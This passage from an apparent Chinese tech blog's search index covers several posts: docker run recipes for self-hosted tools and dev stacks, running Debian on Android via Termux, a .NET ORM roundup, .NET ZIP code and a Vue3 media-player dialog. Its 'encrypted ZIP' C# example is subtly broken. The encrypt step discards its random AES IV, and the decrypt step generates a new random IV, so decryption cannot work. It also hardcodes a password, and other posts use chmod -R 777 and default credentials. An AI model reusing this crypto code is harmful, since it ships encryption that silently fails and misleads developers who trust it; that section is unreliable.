/etc/passwd:/host/etc/passwd:ro -v /etc/group:/host/etc/group:ro -v /etc/machine-id:/host/etc/machine-id:ro -v /var/lib/netdata:/netdata -v /etc/netdata:/etc/netdata -v /run/docker.sock:/var/run/docker.sock -e NETDATA_CLAIM_TOKEN=my-token -e NETDATA_CLAIM_URL=https://app.netdata.cloud -e NETDATA_CLAIM_ID=my-machine-id netdata/netdata 这些项目不仅功能强大，而且非常容易通过 Docker 快速启动和运行。 开发环境Golang - Go 语言开发环境Go 是一种静态类型的编译语言，适合构建高效的服务和应用程序。启动一个 Go 语言的开发环境： 1docker run -it --name go-lang golang:latest Node.js - JavaScript 运行时环境Node.js 允许你在服务器端运行 JavaScript 代码。启动一个 Node.js 环境： 1docker run -it --name node-app node:latest Python - 多用途编程语言Python 是一种广泛使用的高级编程语言，适用于各种应用场景。启动一个 Python 环境： 1docker run -it --name python-env python:latest Flask - 轻量级 Web 应用框架Flask 是一个用 Python 编写的轻量级 Web 应用框架。启动一个简单的 Flask 应用： 1docker run -d --name flask-app -p 5000:5000 tiangolo/uwsgi-nginx-flask:python3.7 Django - 高级 Web 框架Django 是一个高级的 Python Web 框架，鼓励快速开发和干净、实用的设计。启动一个 Django 应用： 1docker run -d --name django-app -p 8000:8000 python:3.9-slim bash -c &quot;pip install django &amp;&amp; django-admin startproject myproject &amp;&amp; cd myproject &amp;&amp; python manage.py runserver 0.0.0.0:8000&quot; React - 前端 JavaScript 库React 是一个用于构建用户界面的 JavaScript 库。启动一个 React 开发环境： 1234567docker run -it --name react-app -p 3000:3000 node:14 bash# 在容器内执行以下命令npm init react-app my-appcd my-appnpm startVue.js - 前端 JavaScript 框架Vue.js 是一个用于构建用户界面的渐进式框架。启动一个 Vue.js 开发环境： 12345678docker run -it --name vue-app -p 8080:8080 node:14 bash# 在容器内执行以下命令npm install -g @vue/clivue create my-appcd my-appnpm run serveGatsby - 静态站点生成器Gatsby 是一个基于 React 的静态站点生成器，适合构建静态网站和博客。启动一个 Gatsby 开发环境： 123456docker run -it --name gatsby-app -p 8000:8000 node:14 bash# 在容器内执行以下命令npm install -g gatsby-cligatsby new my-sitecd my-sitegatsby develop docker chromium1docker pull registry.cn-shanghai.aliyuncs.com/open-tools/docker-chromium-zh:latest 1docker run -d --name=chromium -p 3000:3000 -v ./data:/config registry.cn-shanghai.aliyuncs.com/open-tools/docker-chromium-zh:latest Optional environment variablesVariable DescriptionCUSTOM_PORT Internal port the container listens on for http if it needs to be swapped from the default 3000.CUSTOM_HTTPS_PORT Internal port the container listens on for https if it needs to be swapped from the default 3001.CUSTOM_USER HTTP Basic auth username, abc is default.PASSWORD HTTP Basic auth password, abc is default. If unset there will be no authSUBFOLDER Subfolder for the application if running a subfolder reverse proxy, need both slashes IE &#x2F;subfolder&#x2F;TITLE The page title displayed on the web browser, default “KasmVNC Client”.FM_HOME This is the home directory (landing) for the file manager, default “&#x2F;config”.START_DOCKER If set to false a container with privilege will not automatically start the DinD Docker setup.DRINODE If mounting in &#x2F;dev&#x2F;dri for DRI3 GPU Acceleration allows you to specify the device to use IE &#x2F;dev&#x2F;dri&#x2F;renderD128LC_ALL Set the Language for the container to run as IE fr_FR.UTF-8 ar_AE.UTF-8NO_DECOR If set the application will run without window borders for use as a PWA.NO_FULL Do not autmatically fullscreen applications when using openbox.REMOTE_DEBUGGING 是否开启远程调试。 默认是 false ，可选值： true 或 falseHEADLESS 是否开启无头模式。 默认是 false ，可选值： true 或 false openbox. Next.js - React 框架的全栈解决方案Next.js 是一个用于构建服务器渲染的 React 应用程序的框架。启动一个 Next.js 开发环境： 123456docker run -it --name next-app -p 3000:3000 node:14 bash# 在容器内执行以下命令npx create-next-app my-appcd my-appnpm run dev drawio这是一个高人气的免费在线图表软件，用于创建流程图、UML 图、架构图等。支持多种文件格式，并且可以与 Google Drive、OneDrive 等云存储服务集成，支持实时协作编辑功能。在线使用地址：https://app.diagrams.net/ 1docker run -it --rm --name=&quot;draw&quot; -p 8080:8080 -p 8443:8443 jgraph/drawio easyimage一个简单的图床程序，功能简单，无需数据库。 1docker run -itd --name easyimage -p 8080:80 -e TZ=Asia/Shanghai -e PUID=1000 -e PGID=1000 -e DEBUG=false -v /share/Data/easyimage/config:/app/web/config -v /share/Data/easyimage/i:/app/web/i ddsderek/easyimage:latest Neko这是一个在 Docker 中运行并使用 WebRTC 技术的自托管虚拟浏览器。Neko 是一个功能强大的工具，允许您在虚拟环境中运行功能齐全的浏览器，使您能够从任何地方安全、私密地访问互联网。借助 Neko，您可以像在常规浏览器上一样浏览网页、运行应用程序并执行其他任务，所有这些都在安全且隔离的环境中进行。无论您是想要测试 Web 应用程序的开发人员、寻求安全浏览体验的注重隐私的用户，还是只是想要利用虚拟浏览器的便利性和灵活性的人，Neko 是完美的解决方案。 1234567891011121314docker run -d \\ --restart always \\ --name neko \\ --shm-size=&quot;2gb&quot; \\ -p 8080:8080 \\ -p 52000-52100:52000-52100/udp \\ -e NEKO_PASSWORD=&#x27;neko&#x27; \\ -e NEKO_PASSWORD_ADMIN=&#x27;admin&#x27; \\ -e NEKO_NAT1TO1=43.156.38.52 \\ -e NEKO_SCREEN=1920x1080@30 \\ -e NEKO_ICELITE=1 \\ -e NEKO_EPR=52000-52100 \\ m1k1o/neko:latest speedtest-x网速测试 12docker run -d --name speedtest-x --restart always -p 9001:80 -it badapple9/speedtest-x myspeed 网速测试1234567docker run -d \\ --restart always \\ --name myspeed \\ -p 8080:5216 \\ -v /data/myspeed/data:/myspeed/data \\ germannewsmaker/myspeed SurveyKing调查问卷系统和考试系统1docker run -d --name SurveyKing --restart always -p 8080:1991 surveyking/surveyking admin 123456 驾考考试&#x2F;问卷 EnBizCard基于 HTML 的交互式和响应式数字名片。 123456docker run -d \\ --restart unless-stopped \\ --name enbizcard \\ -p 5600:80 \\ swr.cn-north-4.myhuaweicloud.com/jeven/enbizcard SyncTV一起看视频 1234567891011docker run -d --name synctv -p 8080:8080 synctvorg/synctvdocker run -d \\ \\--name briefing \\-v /datar/briefing/data:/app/data \\-p 8080:8080 \\--restart always \\holtwick/briefing go-file 图床1234mkdir -p /data/go-file/datachmod -R 777 /data/go-file/docker run -d --restart always -p 8080:3000 -e TZ=Asia/Shanghai -v /data/go-file/data:/data justsong/go-file Adminer 轻量级的 MySQL 管理工具1docker run --name adminer -d -p 8080:8080 adminer Docker Compose使用 Docker Compose 来启动一个包含 Nginx 和 PHP-FPM 的 WordPress 环境。 步骤 1: 安装 Docker 和 Docker Compose首先，确保你已经在机器上安装了 Docker 和 Docker Compose。 安装 Docker打开终端或命令提示符。根据操作系统，按照官方文档安装 Docker：Ubuntu: 12345sudo apt-get updatesudo apt-get install docker.ioMacOS: 下载并安装 Docker Desktop for MacWindows: 下载并安装 Docker Desktop for Windows安装 Docker Compose 在终端或命令提示符中运行以下命令： 123sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-composesudo chmod +x /usr/local/bin/docker-composedocker-compose --version 步骤 2: 创建项目目录创建一个新的目录来存放项目文件： 12mkdir wordpress-projectcd wordpress-project 步骤 3: 创建 docker-compose.yml 文件使用你喜欢的文本编辑器（如 nano 或 vim）创建 docker-compose.yml 文件： 1nano docker-compose.yml 将以下内容复制并粘贴到 docker-compose.yml 文件中：123456789101112131415161718192021222324252627version: &#x27;3&#x27;services: db: image: mysql:5.7 volumes: - db_data:/var/lib/mysql restart: always environment: MYSQL_ROOT_PASSWORD: somewordpress MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress wordpress: depends_on: - db image: wordpress:latest ports: - &quot;8000:80&quot; restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: wordpress WORDPRESS_DB_NAME: wordpressvolumes: db_data: 保存并关闭文件。 步骤 4: 启动 Docker Compose在终端或命令提示符中，导航到项目目录： 1cd wordpress-project 运行以下命令启动 Docker Compose：1docker-compose up -d -d 参数表示在后台运行容器。 步骤 5: 访问 WordPress打开浏览器，访问 http://localhost:8000。看到 WordPress 的安装页面。按照提示完成安装过程。 步骤 6: 停止和删除容器如果你需要停止和删除所有容器，可以运行以下命令： 1docker-compose down version: ‘3’: 指定 Docker Compose 文件的版本。services: 定义了多个服务，每个服务对应一个容器。db: 定义了一个 MySQL 数据库服务。image: mysql:5.7: 使用 MySQL 5.7 镜像。volumes: 将主机上的 db_data 卷挂载到容器的 &#x2F;var&#x2F;lib&#x2F;mysql 目录。environment: 设置环境变量，如数据库密码和用户名。wordpress: 定义了一个 WordPress 服务。depends_on: 指定该服务依赖于 db 服务。image: wordpress:latest: 使用最新版本的 WordPress 镜像。ports: 将主机的 8000 端口映射到容器的 80 端口。environment: 设置环境变量，如数据库主机地址和用户名。volumes: 定义了数据卷，用于持久化数据。","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"android run linux","slug":"android-run-linux","date":"2024-10-26T14:39:32.000Z","updated":"2024-12-03T18:10:44.564Z","comments":true,"path":"2024/10/26/android-run-linux/","permalink":"https://banjinmei.github.io/2024/10/26/android-run-linux/","excerpt":"","text":"在安卓中运行linuxAnLinux-Apphttps://github.com/EXALAB/AnLinux-Appdownload anlinux 安装完选择安装的linux系统 复制启动&#x2F;安装命令 安装termux（如果没装）https://github.com/termux/termux-app （安装好了之后，进入termux界面： 执行termux-setup-storage 来申请一下内存卡权限 然后同意就行了，之后执行以下命令： 1pkg update &amp;&amp; pkg upgrade） 启动 粘贴运行命令 安装完 1./start-debian.sh 启动 debian 查IP1234567suapt updateapt install sudosudo apt install net-toolsifconfig 修改密码12345678910su# 输入当前 root 用户的密码passwd# 输入新密码Enter new UNIX password:# 再次输入新密码以确认Retype new UNIX password:# 确认密码更改成功passwd: password updated successfullyexit linux 命令1：文件管理 mv命令 – 移动或改名文件 ls命令 – 显示目录中文件及其属性信息 cp命令 – 复制文件或目录 mkdir命令 – 创建目录文件 pwd命令 – 显示当前工作目录的路径 tar命令 – 压缩和解压缩文件 cd命令 – 切换目录 chmod命令 – 改变文件或目录权限2：文档编辑 cat命令 – 在终端设备上显示文件内容 grep命令 – 强大的文本搜索工具 rm命令 – 删除文件或目录 echo命令 – 输出字符串或提取后的变量值 tail命令 – 查看文件尾部内容 rmdir命令 – 删除空目录文件 sed命令 – 批量编辑文本文件 vi命令 – 文本编辑器3：系统管理 find命令 – 根据路径和条件搜索指定文件 rpm命令 – RPM软件包管理器 ps命令 – 显示进程状态 startx命令 – 初始化X-window系统 uname命令 – 显示系统内核信息 kill命令 – 杀死进程 resize2fs命令 – 同步文件系统容量到内核 useradd命令 – 创建并设置用户信息4：磁盘管理 df命令 – 显示磁盘空间使用量情况 fdisk命令 – 管理磁盘分区 lsblk命令 – 查看系统的磁盘使用情况 mkfs.ext4 命令 – 对磁盘设备进行EXT4格式化 vgextend命令 – 扩展卷组设备 hdparm命令 – 显示与设定硬盘参数 pvcreate命令 – 创建物理卷设备 lvcreate命令 – 创建逻辑卷设备5：文件传输 tftp命令 – 上传及下载文件 curl命令 – 文件传输工具 fsck命令 – 检查与修复文件系统 rsync命令 – 远程数据同步工具 lprm命令 – 移除打印队列中的任务 ftpwho命令 – 显示FTP会话信息 ftp命令 – 文件传输协议客户端 lftp命令 – 优秀的命令行FTP客户端6：网络通讯 ssh命令 – 安全的远程连接服务 netstat命令 – 显示网络状态 dhclient命令 – 动态获取或释放IP地址 ifconfig命令 – 显示或设置网络设备参数信息 ping命令 – 测试主机间网络连通性 sshd命令 – openssh服务器守护进程 smbpasswd命令 – 修改用户的SMB密码 iptables命令 – 防火墙策略管理工具7：设备管理 mount命令 – 将文件系统挂载到目录 lspci命令 – 显示当前设备PCI总线设备信息 sensors命令 – 检测服务器硬件信息 rfkill命令 – 管理蓝牙和Wi-Fi设备 setleds命令 – 设置键盘的LED灯光状态 setpci命令 – 配置PCI硬件设备参数 hciconfig命令 – 配置蓝牙设备 lsusb命令 – 显示USB设备列表8：备份压缩 zip命令 – 压缩文件 gzip命令 – 压缩和解压文件 unzip命令 – 解压缩zip格式文件 zipinfo命令 – 查看压缩文件信息 gunzip命令 – 解压提取文件内容 unarj命令 – 解压.arj文件 zipsplit命令 – 分割压缩包 dump命令 – 备份文件系统9：其他命令 wget命令 – 下载网络文件 history命令 – 显示与管理历史命令记录 hash命令 – 管理命令运行时查询的哈希表 wait命令 – 等待指令执行完毕 bc命令 – 数字计算器 rmmod命令 – 移除内核模块 pigz命令 – 多线程的解压缩文件 xargs命令 – 给其他命令传参数的过滤器 linux命令 linux常用命令","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://banjinmei.github.io/tags/linux/"}],"author":"mu"},{"title":".net orm","slug":"net-orm","date":"2024-10-26T14:35:57.000Z","updated":"2024-10-26T14:38:36.599Z","comments":true,"path":"2024/10/26/net-orm/","permalink":"https://banjinmei.github.io/2024/10/26/net-orm/","excerpt":"","text":"SqlSugarnuget 安装 SqlSugar 安装 MySql.Data 实体类 123456789101112131415[SugarTable(&quot;IMMenu&quot;)]class IMMenu&#123; [SugarColumn(IsPrimaryKey = true, IsIdentity = true)] //id public int id &#123; get; set; &#125; public string name &#123; get; set; &#125; // 其他属性... public override string ToString() &#123; return $&quot;id: &#123;id&#125;, name: &#123;name&#125;&quot;; &#125;&#125; 使用 123456789101112131415161718// 连接字符串string connectionString = &quot;server=xxx;user=root;password=xxx;database=DB&quot;;// 创建SqlSugar客户端实例SqlSugarClient db = new SqlSugarClient(new ConnectionConfig()&#123; ConnectionString = connectionString, DbType = DbType.MySql, IsAutoCloseConnection = true, InitKeyType = InitKeyType.Attribute&#125;);// 查询数据var data = db.Queryable&lt;IMMenu&gt;().ToList();// 输出结果data.ForEach(item =&gt; Console.WriteLine(item.ToString())); dapper123456789101112131415161718192021public class IMMenu&#123; public int id &#123; get; set; &#125; public string name &#123; get; set; &#125; &#125;public class DapperExample&#123; public static IEnumerable&lt;IMMenu&gt; GetAllIMMenus(string connectionString) &#123; using (IDbConnection db = new MySqlConnection(connectionString)) &#123; return db.Query&lt;IMMenu&gt;(&quot;SELECT * FROM IMMenu&quot;); &#125; &#125;&#125; 1234567 string connectionString = &quot;server=xxx;user=root;password=xxx;database=DB&quot;;IEnumerable&lt;IMMenu&gt; ms = DapperExample.GetAllIMMenus(connectionString);foreach (var m in ms)&#123; Console.WriteLine($&quot;Id: &#123;m.id&#125;, Name: &#123;m.name&#125;&quot;);&#125; EF&#x2F;EF CoreEntity Framework (EF) Core 是轻量化、可扩展、开源和跨平台版的常用 Entity Framework 数据访问技术，EF Core 是适用于 .NET 的现代对象数据库映射器。它支持 LINQ 查询、更改跟踪、更新和架构迁移。EF Core 通过提供程序插件 API 与 SQL Server、Azure SQL 数据库、SQLite、Azure Cosmos DB、MySQL、PostgreSQL 和其他数据库一起使用（微软官方出品）。 官方文档教程：https://docs.microsoft.com/zh-cn/ef/GitHub地址：https://github.com/dotnet/efcore DapperDapper是一个简单的.NET对象映射器，在速度方面具有”King of Micro ORM”的头衔，几乎与使用原始的ADO.NET数据读取器一样快。ORM是一个对象关系映射器，它负责数据库和编程语言之间的映射。Dapper通过扩展IDbConnection提供一些有用的扩展方法去查询您的数据库。 官方文档教程：https://www.learndapper.com/GitHub地址：https://github.com/DapperLib/Dapper SqlSugarSqlSugar 是一款 老牌 .NET 开源多库架构ORM框架（EF Core单库架构），由果糖大数据科技团队 维护和更新 ，开箱即用最易上手的.NET ORM框架 。 官网地址：http://www.donet5.comGitHub地址：https://github.com/donet5/SqlSugar FreeSqlFreeSql 是一款功能强大的对象关系映射（O&#x2F;RM）组件，支持 .NET Core 2.1+、.NET Framework 4.0+ 以及 Xamarin。 GitHub地址：https://github.com/dotnetcore/FreeSql Chloe.ORMChloe.ORM 是一款国产十分稳定可靠的 ORM 框架。除了常规增删查改外还支持连接查询、分组查询、聚合查询、子查询，大部分操作可通过 lambda 完成。还支持分库分表分页、聚合、分组聚合，并支持多个字段组合分片以及多字段路由。 文档地址：https :&#x2F;&#x2F;github.com&#x2F;shuxinqin&#x2F;Chloe&#x2F;wikiGitHub地址：https://github.com/shuxinqin/Chloe nhibernate-coreNHibernate是.NET框架的成熟、开源的对象关系映射工具。它在积极开发中，功能齐全，并已成功应用于数千个项目中。 NHibernate社区网站: https://nhibernate.infoGitHub地址：https://github.com/nhibernate/nhibernate-core SmartSqlSmartSql &#x3D; C# 中的 MyBatis + .NET Core+ 缓存（内存 | Redis）+ R&#x2F;W 拆分 + PropertyChangedTrack +动态存储库 + InvokeSync + 诊断。SmartSql 借鉴了 MyBatis 的思想，使用 XML 来管理 SQL ，并且提供了若干个筛选器标签来消除代码层面的各种 if&#x2F;else 的判断分支。SmartSql将管理你的 SQL ，并且通过筛选标签来维护本来你在代码层面的各种条件判断，使你的代码更加优美。 文档地址： https://smartsql.net/guide/GitHub地址：https://github.com/dotnetcore/SmartSql PetaPocoPetaPoco 是一个用于 .NET（4、4.5+、net standard 2.0+）和 Mono 的微型、快速、易于使用的 micro-ORM。由于 PetaPoco 所代表的简单性和易用性，它受到许多人的喜爱。PetaPoco 是首选的微 ORM，也是任何体面的开发人员工具包中必不可少的实用程序。 文档地址：https://discoverdot.net/projects/peta-pocoGitHub地址：https://github.com/CollaboratingPlatypus/PetaPoco linq2dbLINQ to DB 是最快的LINQ数据库访问库，在POCO对象和数据库之间提供了一个简单、轻量、快速且类型安全的层。在架构上，它比 Dapper、Massive 或 PetaPoco 等微 ORM 高出一步，因为您使用 LINQ 表达式，而不是魔术字符串，同时在代码和数据库之间维护一个薄抽象层。您的查询由 C# 编译器检查并允许轻松重构。但是，它不像 LINQ to SQL 或实体框架那么重。没有更改跟踪，因此您必须自己进行管理，但从积极的方面来说，您可以获得更多控制权并更快地访问您的数据。 文档地址：https://linq2db.github.io/GitHub地址：https://github.com/linq2db/linq2db RepoDbRepoDB是一个开源的.NET ORM库，它弥合了微ORM和完整ORM之间的差距。它帮助您简化在开发过程中何时使用基本操作和高级操作的切换。 GitHub地址：https://github.com/mikependon/RepoDB ServiceStack.OrmLiteOrmLite是一个快速、简单、类型化的.NET ORM，OrmLite 的目标是提供一个方便、DRY、无配置、与 RDBMS 无关的类型包装器，该包装器与 SQL 保持高度亲和性，公开直观的 API，生成可预测的 SQL 并干净地映射到断开连接和数据传输对象 (DTO) 友好、普通的旧C# 对象 (POCO)。这种方法更容易推理您的数据访问，从而清楚地知道什么 SQL 在什么时间执行，同时减轻意外行为、隐式 N+1 查询和重对象关系映射器 (ORM) 中普遍存在的泄漏数据访问。 文档地址：https://docs.servicestack.net/ormlite/GitHub地址：https://github.com/ServiceStack/ServiceStack.OrmLite SQLite-net简单、强大、跨平台的 SQLite 客户端和 .NET 的 ORM。 GitHub地址：https://github.com/praeclarum/sqlite-net Insight.DatabaseInsight.Database是一个用于 .NET 的快速、轻量级的 micro-orm。 GitHub地址：https://github.com/jonwagner/Insight.Database cyqdatacyq.data是一个高性能且功能最强大的orm（支持.NET Core），支持Txt、Xml、Access、Sqlite、Mssql、Mysql、Oracle、Sybase、Postgres、DB2、Redis、MemCache。 GitHub地址：https://github.com/cyq1162/cyqdata querybuilderSQL 查询构建器，用 c# 编写，帮助您轻松构建复杂的查询，支持 SqlServer、MySql、PostgreSql、Oracle、Sqlite 和 Firebird。 官网地址：https://sqlkata.com/GitHub地址：https://github.com/sqlkata/querybuilder TinyORMTinyORM是一个简单、快速且安全的微型.NET ORM。 Wiki地址：https://github.com/sdrapkin/SecurityDriven.TinyORM/wikiGitHub地址：https://github.com/sdrapkin/SecurityDriven.TinyORM","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"orm","slug":"orm","permalink":"https://banjinmei.github.io/tags/orm/"}],"author":"mu"},{"title":".NET ZIP","slug":"NET-ZIP","date":"2024-10-16T17:03:45.000Z","updated":"2024-10-16T17:06:35.265Z","comments":true,"path":"2024/10/17/NET-ZIP/","permalink":"https://banjinmei.github.io/2024/10/17/NET-ZIP/","excerpt":"","text":"压缩一个目录为 ZIP 文件12345678910111213141516using System;using System.IO.Compression;class Program&#123; static void Main() &#123; string startPath = @&quot;c:\\example\\start&quot;; // 要压缩的目录路径 string zipPath = @&quot;c:\\example\\result.zip&quot;; // 输出的 ZIP 文件路径 ZipFile.CreateFromDirectory(startPath, zipPath); Console.WriteLine(&quot;压缩完成！&quot;); &#125;&#125; 压缩单个文件到 ZIP 文件12345678910111213141516171819202122232425using System;using System.IO;using System.IO.Compression;class Program&#123; static void Main() &#123; string filePath = @&quot;c:\\example\\file.txt&quot;; // 要压缩的文件路径 string zipPath = @&quot;c:\\example\\result.zip&quot;; // 输出的 ZIP 文件路径 using (FileStream fs = File.OpenRead(filePath)) using (FileStream zipFs = File.Create(zipPath)) using (ZipArchive archive = new ZipArchive(zipFs, ZipArchiveMode.Create)) &#123; var fileEntry = archive.CreateEntry(Path.GetFileName(filePath)); using (Stream entryStream = fileEntry.Open()) &#123; fs.CopyTo(entryStream); &#125; &#125; Console.WriteLine(&quot;压缩完成！&quot;); &#125;&#125; 解压 ZIP 文件12345678910111213141516using System;using System.IO.Compression;class Program&#123; static void Main() &#123; string zipPath = @&quot;c:\\example\\result.zip&quot;; // 输入的 ZIP 文件路径 string extractPath = @&quot;c:\\example\\extract&quot;; // 解压的目标目录 ZipFile.ExtractToDirectory(zipPath, extractPath); Console.WriteLine(&quot;解压完成！&quot;); &#125;&#125; 加密压缩文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152using System;using System.IO;using System.IO.Compression;using System.Security.Cryptography;class Program&#123; static void Main() &#123; string sourceFile = @&quot;c:\\example\\file.txt&quot;; // 要压缩的文件路径 string zipPath = @&quot;c:\\example\\encrypted.zip&quot;; // 输出的 ZIP 文件路径 string password = &quot;110110&quot;; // 设置的密码 using (FileStream zipToOpen = new FileStream(zipPath, FileMode.Create)) using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Create, true)) &#123; ZipArchiveEntry entry = archive.CreateEntry(Path.GetFileName(sourceFile)); using (Stream entryStream = entry.Open()) using (Aes aes = Aes.Create()) &#123; aes.Key = GetKey(password); // 获取 AES 密钥 aes.IV = GetIV(); // 获取 AES 初始化向量 using (CryptoStream cryptoStream = new CryptoStream(entryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)) using (FileStream fileToCompress = new FileStream(sourceFile, FileMode.Open)) &#123; fileToCompress.CopyTo(cryptoStream); &#125; &#125; &#125; Console.WriteLine(&quot;加密压缩完成！&quot;); &#125; private static byte[] GetKey(string password) &#123; using (SHA256 sha256 = SHA256.Create()) &#123; return sha256.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password)); &#125; &#125; private static byte[] GetIV() &#123; byte[] iv = new byte[16]; // AES 需要 16 字节的 IV using (RandomNumberGenerator rng = RandomNumberGenerator.Create()) &#123; rng.GetBytes(iv); &#125; return iv; &#125;&#125; 解密解压文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758using System;using System.IO;using System.IO.Compression;using System.Security.Cryptography;class Program&#123; static void Main() &#123; string zipPath = @&quot;c:\\example\\encrypted.zip&quot;; // 输入的 ZIP 文件路径 string extractPath = @&quot;c:\\example\\extract&quot;; // 解压的目标目录 string password = &quot;110110&quot;; // 设置的密码 using (FileStream zipToOpen = new FileStream(zipPath, FileMode.Open)) using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Read)) &#123; foreach (ZipArchiveEntry entry in archive.Entries) &#123; string entryFilePath = Path.Combine(extractPath, entry.FullName); Directory.CreateDirectory(Path.GetDirectoryName(entryFilePath)); using (Stream entryStream = entry.Open()) using (Aes aes = Aes.Create()) &#123; aes.Key = GetKey(password); // 获取 AES 密钥 aes.IV = GetIV(); // 获取 AES 初始化向量 using (CryptoStream cryptoStream = new CryptoStream(entryStream, aes.CreateDecryptor(), CryptoStreamMode.Read)) using (FileStream fileToExtract = new FileStream(entryFilePath, FileMode.Create)) &#123; cryptoStream.CopyTo(fileToExtract); &#125; &#125; &#125; &#125; Console.WriteLine(&quot;解密解压完成！&quot;); &#125; private static byte[] GetKey(string password) &#123; using (SHA256 sha256 = SHA256.Create()) &#123; return sha256.ComputeHash(System.Text.Encoding.UTF8.GetBytes(password)); &#125; &#125; private static byte[] GetIV() &#123; byte[] iv = new byte[16]; // AES 需要 16 字节的 IV using (RandomNumberGenerator rng = RandomNumberGenerator.Create()) &#123; rng.GetBytes(iv); &#125; return iv; &#125;&#125;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"}],"author":"mu"},{"title":"vue3 dialog play aac mp4","slug":"vue3-dialog-play-aac-mp4","date":"2024-10-15T17:29:29.000Z","updated":"2024-10-15T17:32:59.592Z","comments":true,"path":"2024/10/16/vue3-dialog-play-aac-mp4/","permalink":"https://banjinmei.github.io/2024/10/16/vue3-dialog-play-aac-mp4/","excerpt":"","text":"vue3 play acc mp4 show png 1234567891011121314151617181920212223&lt;template&gt; &lt;div v-if=&quot;scope.row.MsgType == 7 || scope.row.MsgType == 19&quot;&gt; &lt;el-button :type=&quot;playingRowId === scope.row.AutoID ? &#x27;warning&#x27; : &#x27;info&#x27;&quot; :disabled=&quot;playingRowId === scope.row.AutoID&quot; @click=&quot;handleD(scope.row.Content, scope.row.MsgType, scope.row.UserID, scope.row.AutoID)&quot; &gt; &#123;&#123; playingRowId === scope.row.AutoID ? &#x27;播放中&#x27; : &#x27;播放&#x27; &#125;&#125; &lt;/el-button&gt; &lt;/div&gt; &lt;!-- MP4 Dialog --&gt; &lt;el-dialog :visible.sync=&quot;dialogVisible&quot; width=&quot;80%&quot; center @close=&quot;handleDialogClose&quot;&gt; &lt;video ref=&quot;videoPlayer&quot; controls autoplay @ended=&quot;handleDialogClose&quot; :src=&quot;mediaSource&quot; style=&quot;width: 100%;&quot; &gt;&lt;/video&gt; &lt;/el-dialog&gt;&lt;/template&gt; JS代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;;import &#123; ElMessage &#125; from &#x27;element-plus&#x27;;import request from &#x27;@/api/request&#x27;; // Assuming you use Axios or similarconst playingRowId = ref(null); // Tracks the AutoID of the row currently being playedconst dialogVisible = ref(false);const mediaSource = ref(&#x27;&#x27;);async function handleD(com, msgt, userid, autoid) &#123; try &#123; // Set the current row&#x27;s AutoID as the playing row playingRowId.value = autoid; const response = await request(&#123; url: &#x27;/adm/zuserApi/FdMsgJMCon&#x27;, method: &#x27;put&#x27;, data: &#123; com, msgtype: String(msgt), userid: String(userid) // Use UserID for API request &#125; &#125;); const &#123; isOk, msg &#125; = response; if (isOk) &#123; if (msg.endsWith(&#x27;.aac&#x27;)) &#123; playAAC(msg, autoid); &#125; else if (msg.endsWith(&#x27;.mp4&#x27;)) &#123; playMP4(msg); &#125; &#125; else &#123; ElMessage.error(&#x27;获取失败，请检查网络连接或联系管理员&#x27;); &#125; &#125; catch (error) &#123; console.error(&#x27;获取时发生错误:&#x27;, error); ElMessage.error(&#x27;获取失败，请检查网络连接或联系管理员&#x27;); &#125;&#125;function playAAC(source, autoid) &#123; const audio = new Audio(source); audio.play(); audio.onended = () =&gt; &#123; // Reset the playing row when playback finishes if (playingRowId.value === autoid) &#123; playingRowId.value = null; &#125; &#125;; audio.onerror = () =&gt; &#123; if (playingRowId.value === autoid) &#123; playingRowId.value = null; &#125; ElMessage.error(&#x27;音频播放失败&#x27;); &#125;;&#125;function playMP4(source) &#123; mediaSource.value = source; dialogVisible.value = true;&#125;function handleDialogClose() &#123; dialogVisible.value = false; playingRowId.value = null; // Reset when the dialog is closed&#125;&lt;/script&gt; 设置媒体源（mediaSource）：确保在打开对话框之前，视频的来源（mediaSource.value）已正确设置为MP4的URL。设置对话框可见性（dialogVisible）：必须将dialogVisible.value设置为true，以确保对话框能够打开。视频元素：视频元素的src属性应绑定到mediaSource，并且该元素应在el-dialog组件中可见。 弹窗注意引入 Element Plusv-model&#x3D;”dialogVisible” console.log(‘Dialog visible:’, dialogVisible.value); &#x2F;&#x2F; trueconsole.log(‘Video source:’, mediaSource.value); &#x2F;&#x2F; MP4 URL 图片显示使用 Element Plus 提供的 el-image-viewer 组件。这个组件允许你点击图片时显示大图，带有放大、缩小、旋转等功能 12345678910111213&lt;!-- 缩略图 --&gt; &lt;el-image style=&quot;width: 80px; height: 80px&quot; :src=&quot;scope.row.ContentT2&quot; @click=&quot;handleImageClick(scope.row.ContentT2)&quot; &gt; &lt;template #error&gt; ERR &lt;/template&gt; &lt;/el-image&gt; &lt;!-- 大图查看器 --&gt; &lt;el-dialog :visible.sync=&quot;dialogVisible&quot; width=&quot;80%&quot; center @close=&quot;closeDialog&quot; append-to-body&gt; &lt;el-image-viewer :url-list=&quot;urlList&quot; :initial-index=&quot;0&quot; @close=&quot;closeDialog&quot; v-if=&quot;dialogVisible&quot; /&gt; &lt;/el-dialog&gt; JS代码 1234567891011121314151617&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;;const dialogVisible = ref(false); // 控制对话框是否可见const urlList = ref([]); // 图片列表// 